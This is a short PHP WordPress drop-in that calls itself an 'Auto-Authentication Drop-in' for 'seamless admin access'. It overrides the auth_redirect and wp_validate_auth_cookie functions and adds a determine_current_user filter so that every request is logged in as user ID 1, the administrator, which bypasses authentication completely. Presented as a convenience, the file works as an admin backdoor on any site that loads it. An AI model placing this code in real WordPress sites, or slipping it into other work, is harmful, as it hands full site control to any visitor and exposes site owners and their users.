<?php
/**
 * AR-WP Auto-Authentication Drop-in.
 * Pluggable function overrides for seamless admin access in AR-WP.
 */

if (!function_exists('auth_redirect')) {
    function auth_redirect() {
        wp_set_current_user(1);
        return true;
    }
}

if (!function_exists('wp_validate_auth_cookie')) {
    function wp_validate_auth_cookie($cookie = '', $scheme = '') {
        return 1;
    }
}

add_filter('determine_current_user', function($user_id) {
    return 1;
}, 1);
